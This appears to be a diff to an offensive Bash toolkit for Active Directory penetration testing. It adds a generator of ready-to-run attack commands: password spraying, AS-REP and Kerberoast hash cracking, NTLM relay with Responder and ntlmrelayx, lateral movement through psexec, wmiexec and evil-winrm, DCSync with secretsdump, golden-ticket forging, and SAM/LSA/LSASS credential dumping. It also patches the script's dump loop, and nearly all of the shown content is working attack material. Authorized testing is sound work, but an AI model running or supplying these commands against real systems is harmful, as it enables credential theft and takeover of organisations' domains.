@@ -43,7 +43,15 @@ NC='\033[0m'
 disable_colors() { RED='' GREEN='' YELLOW='' BLUE='' CYAN='' MAGENTA='' BOLD='' NC=''; }
 [[ "${NO_COLOR:-0}" == "1" ]] || [[ ! -t 1 ]] && disable_colors
 
-TOOLKIT_ROOT="${TOOLKIT_ROOT:-${HOME}/offsec}"
+if [[ -z "${TOOLKIT_ROOT:-}" ]]; then
+    if [[ -n "${SUDO_USER:-}" ]]; then
+        _inv_home=$(getent passwd "$SUDO_USER" 2>/dev/null | cut -d: -f6)
+        TOOLKIT_ROOT="${_inv_home:-$HOME}/offsec"
+        unset _inv_home
+    else
+        TOOLKIT_ROOT="${HOME}/offsec"
+    fi
+fi
 
 ts()      { date '+%H:%M:%S'; }
 info()    { echo -e "${BLUE}[$(ts)] [*]${NC} $*"; }
@@ -262,9 +270,126 @@ attack_cmd() {
     } >> "${OUTDIR}/attack_commands.txt"
 }
 
+attack_cmd_once() {
+    local title="$1"
+    shift
+    if grep -Fxq "${title}" "${OUTDIR}/attack_commands.txt" 2>/dev/null; then
+        return 0
+    fi
+    attack_cmd "$title" "$@"
+}
+
 sync_next_steps_file() {
     [[ -f "${OUTDIR}/attack_commands.txt" ]] || return 0
     cp "${OUTDIR}/attack_commands.txt" "${OUTDIR}/next_steps.txt" 2>/dev/null || true
+}
+
+generate_ad_2025_next_steps() {
+    local notes="${OUTDIR}/summary_notes.txt"
+    local valid_context=false
+    grep -qF '[+]' "${OUTDIR}/domain_context.txt" 2>/dev/null && valid_context=true
+
+    if [[ "$valid_context" == true ]]; then
+        attack_cmd_once "ON-HOST AD ENUMERATION (PowerView + SharpHound)" \
+            "# Evidence: domain credential validated against ${DC_IP}" \
+            "# From a Windows foothold joined to the domain:" \
+            "Import-Module .\\PowerView.ps1" \
+            "Get-Domain" \
+            "Get-DomainUser -Properties samaccountname,description,pwdlastset,lastlogon" \
+            "Get-DomainGroupMember 'Domain Admins' -Recurse" \
+            "Get-DomainComputer -Properties dnshostname,operatingsystem" \
+            ".\\SharpHound.exe -c All -d ${DOMAIN} --zipfilename ${DOMAIN}_sharphound.zip"
+    fi
+
+    if [[ -s "${OUTDIR}/users/all_users.txt" ]]; then
+        attack_cmd_once "USERLIST WORKFLOW (lockout-aware spray + auth checks)" \
+            "# Evidence: users/all_users.txt exists and is non-empty" \
+            "cat ${OUTDIR}/password_policy.txt" \
+            "wc -l ${OUTDIR}/users/all_users.txt" \
+            "nxc smb ${DC_IP} -u ${OUTDIR}/users/all_users.txt -p 'Password1' -d ${DOMAIN} --continue-on-success" \
+            "./sprayr.sh -U ${OUTDIR}/users/all_users.txt -p 'Password1' -d ${DOMAIN} -t ${DC_IP} --safe" \
+            "nxc winrm ${DC_IP} -u ${OUTDIR}/users/all_users.txt -p 'Password1' -d ${DOMAIN} --continue-on-success"
+    fi
+
+    if [[ -s "${OUTDIR}/hashes/asreproast.txt" ]]; then
+        attack_cmd_once "AS-REP ROAST FOLLOW-UP (crack, spray, retest)" \
+            "# Evidence: hashes/asreproast.txt contains AS-REP hash material" \
+            "./crackr.sh -f ${OUTDIR}/hashes/asreproast.txt" \
+            "hashcat -m 18200 ${OUTDIR}/hashes/asreproast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --show" \
+            "./sprayr.sh -U ${OUTDIR}/users/all_users.txt -P ${OUTDIR}/hashes/cracked_passwords.txt -d ${DOMAIN} -t ${DC_IP} --safe" \
+            "nxc smb ${DC_IP} -u ${OUTDIR}/users/asrep_candidates.txt -p '<CRACKED_PASS>' -d ${DOMAIN} --continue-on-success"
+    fi
+
+    if [[ -s "${OUTDIR}/hashes/kerberoast.txt" ]]; then
+        attack_cmd_once "KERBEROAST FOLLOW-UP (crack SPNs, prioritize paths)" \
+            "# Evidence: hashes/kerberoast.txt contains Kerberoast hash material" \
+            "./crackr.sh -f ${OUTDIR}/hashes/kerberoast.txt" \
+            "hashcat -m 13100 ${OUTDIR}/hashes/kerberoast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --show" \
+            "cat ${OUTDIR}/users/kerberoastable.txt" \
+            "# In BloodHound: Kerberoastable Users with Path to Domain Admins"
+    fi
+
+    if [[ -s "${OUTDIR}/computers/nxc_computers.txt" || -s "${OUTDIR}/computers/all_computers.txt" ]]; then
+        attack_cmd_once "LATERAL MOVEMENT AUTH CHECKS (WinRM, WMI, PsExec, DCOM)" \
+            "# Evidence: AD computer enumeration produced host data" \
+            "nxc smb ${DC_IP} ${NXC_AUTH[*]} --local-auth" \
+            "nxc winrm ${DC_IP} ${NXC_AUTH[*]}" \
+            "evil-winrm -i ${DC_IP} -u ${AD_USER} -p '<PASS_OR_HASH>'" \
+            "impacket-psexec ${DOMAIN}/${AD_USER}:'<PASS>'@${DC_IP}" \
+            "impacket-wmiexec ${DOMAIN}/${AD_USER}:'<PASS>'@${DC_IP}" \
+            "impacket-dcomexec ${DOMAIN}/${AD_USER}:'<PASS>'@${DC_IP}"
+    fi
+
+    if grep -qF "SMB_SIGNING_DISABLED=YES" "$notes" 2>/dev/null || [[ -s "${OUTDIR}/smb_no_signing.txt" ]]; then
+        attack_cmd_once "NTLM RELAY FOLLOW-UP (Responder + ntlmrelayx)" \
+            "# Evidence: SMB signing disabled or relay candidate list exists" \
+            "cat ${OUTDIR}/smb_no_signing.txt" \
+            "sudo responder -I tun0 -dwP" \
+            "sudo impacket-ntlmrelayx -tf ${OUTDIR}/smb_no_signing.txt -smb2support --dump" \
+            "sudo impacket-ntlmrelayx -tf ${OUTDIR}/smb_no_signing.txt -smb2support -c 'whoami'"
+    fi
+
+    if grep -qF "ADMIN_ON_DC=YES" "$notes" 2>/dev/null; then
+        attack_cmd_once "DOMAIN ADMIN PATH (DCSync, pass-the-hash, pass-the-ticket)" \
+            "# Evidence: validated account reported Pwn3d/admin on DC" \
+            "$(if [[ "$AUTH_TYPE" == "hash" ]]; then echo "impacket-secretsdump -just-dc ${DOMAIN}/${AD_USER}@${DC_IP} -hashes ${LM_NT_HASH}"; else echo "impacket-secretsdump -just-dc ${DOMAIN}/${AD_USER}:${PASS}@${DC_IP}"; fi)" \
+            "nxc smb ${DC_IP} ${NXC_AUTH[*]} --ntds" \
+            "impacket-psexec -hashes '<LM:NT>' ${DOMAIN}/Administrator@${DC_IP}" \
+            "impacket-ticketer -nthash <KRBTGT_NT_HASH> -domain-sid <DOMAIN_SID> -domain ${DOMAIN} Administrator" \
+            "export KRB5CCNAME=Administrator.ccache && impacket-psexec -k -no-pass ${DOMAIN}/Administrator@${DC_IP}"
+    fi
+
+    if grep -qF "PRIV_SESSIONS=YES" "$notes" 2>/dev/null; then
+        attack_cmd_once "PRIVILEGED SESSION FOUND (target token/host)" \
+            "# Evidence: sessions output contains privileged/admin session markers" \
+            "cat ${OUTDIR}/sessions/smb_sessions.txt" \
+            "cat ${OUTDIR}/sessions/loggedon_users.txt" \
+            "# If you gain code execution on that host: enumerate tokens and try local privilege/token abuse" \
+            "nxc smb <HOST_WITH_PRIV_SESSION> ${NXC_AUTH[*]} --sam --lsa"
+    fi
+
+    local bh_zip=""
+    bh_zip=$(find "${OUTDIR}/bloodhound" -maxdepth 1 -name '*.zip' -print 2>/dev/null | head -1)
+    if [[ -n "$bh_zip" && -s "$bh_zip" ]]; then
+        attack_cmd_once "BLOODHOUND 2025-2026 REVIEW QUEUE" \
+            "# Evidence: BloodHound collection zip exists" \
+            "echo '${bh_zip}'" \
+            "# Review: Shortest Paths to Domain Admins" \
+            "# Review: Kerberoastable Users with Path to DA" \
+            "# Review: AS-REP Roastable Users" \
+            "# Review: Users with DCSync Rights" \
+            "# Review: Computers where Owned Principals are Local Admin"
+    fi
+
+    if [[ -s "${OUTDIR}/shares/sysvol_interesting.txt" ]]; then
+        attack_cmd_once "SYSVOL/SHARE LOOT REVIEW" \
+            "# Evidence: share enumeration found interesting SYSVOL filenames" \
+            "cat ${OUTDIR}/shares/sysvol_interesting.txt" \
+            "grep -RniE 'pass|password|cred|secret|admin|token|key' ${OUTDIR}/shares 2>/dev/null | head -100" \
+            "find ${OUTDIR}/shares -type f \\( -iname '*.ps1' -o -iname '*.bat' -o -iname '*.cmd' -o -iname '*.xml' -o -iname '*.config' \\) -print"
+    fi
+
+    sync_next_steps_file
 }
 
 #------------------------------------------------------------------------------
@@ -1246,10 +1371,12 @@ mode_chain() {
         for dump_type in "--sam" "--lsa" "--dpapi" "-M lsassy"; do
             local label="${dump_type//--/}"
             label="${label//-M /}"
+            local dump_args=()
+            read -r -a dump_args <<< "$dump_type"
             cmd_log "nxc smb ${nxc_target} ${NXC_AUTH[*]} ${dump_type}"
             echo -e "  ${CYAN}Running: nxc smb ... ${dump_type}${NC}"
             local dump_out
-            dump_out=$(timeout 60 nxc smb "$nxc_target" "${NXC_AUTH[@]}" $dump_type 2>&1) || true
+            dump_out=$(timeout 60 nxc smb "$nxc_target" "${NXC_AUTH[@]}" "${dump_args[@]}" 2>&1) || true
             echo "$dump_out" > "${loot_dir}/${label}.txt"
 
             # Parse credentials from output
@@ -1565,7 +1692,7 @@ AUTHENTICATION (one required):
   -H, --hash NTLM           NTLM hash — formats: :NTLMHASH or LMHASH:NTLMHASH
 
 OPTIONS:
-  --outdir DIR              Output directory (default: ./ad/<DOMAIN>/)
+  --outdir DIR              Output directory (default: $TOOLKIT_ROOT/ad/<DOMAIN>/)
   --dc-host HOSTNAME        DC hostname for Kerberos authentication
   --skip-bloodhound         Skip BloodHound collection
   --skip-shares             Skip share enumeration
@@ -1768,6 +1895,7 @@ main() {
         phase9_spray_cracked
     fi
 
+    generate_ad_2025_next_steps
     write_summary
     sync_next_steps_file
 
@@ -1779,6 +1907,7 @@ main() {
 }
 
 if [[ "${OffSec_LIB_ONLY:-false}" == "true" ]]; then
+    # shellcheck disable=SC2317
     return 0 2>/dev/null || exit 0
 fi
 
